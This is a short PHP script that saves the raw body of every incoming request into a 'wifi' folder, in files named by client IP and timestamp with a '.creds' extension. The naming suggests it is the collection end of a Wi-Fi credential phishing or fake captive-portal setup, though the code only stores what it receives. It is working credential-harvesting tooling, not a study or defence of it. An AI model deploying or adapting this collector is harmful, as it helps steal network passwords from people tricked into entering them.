<?php

// change the name below for the folder you want
$dir = "wifi";

$file_to_write = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
$content_to_write = file_get_contents("php://input");

if( is_dir($dir) === false )
{
    mkdir($dir);
}

$file = fopen($dir . '/' . $file_to_write,"w");

// a different way to write content into
// fwrite($file,"Hello World.");

fwrite($file, $content_to_write);

// closes the file
fclose($file);


?>